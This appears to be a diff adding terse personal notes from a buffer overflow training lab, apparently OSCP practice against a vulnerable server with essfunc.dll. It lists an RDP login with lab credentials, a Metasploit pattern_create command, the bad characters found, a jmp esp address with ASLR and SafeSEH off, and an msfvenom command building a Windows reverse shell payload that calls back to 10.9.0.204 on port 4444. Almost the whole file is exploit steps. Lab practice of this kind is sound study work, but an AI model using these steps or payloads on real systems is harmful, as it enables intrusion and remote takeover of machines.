@@ -1,0 +1,16 @@
+xfreerdp /u:admin /p:password /cert:ignore /v:10.10.91.219 /workarea
+
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 700
+
+
+BadChars   00 07 2e a0
+
+
+Log data, item 11
+ Address=625011AF
+ Message=  0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)
+
+ 00 07 2e a0
+
+msfvenom -p windows/shell_reverse_tcp LHOST=10.9.0.204 LPORT=4444 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
+
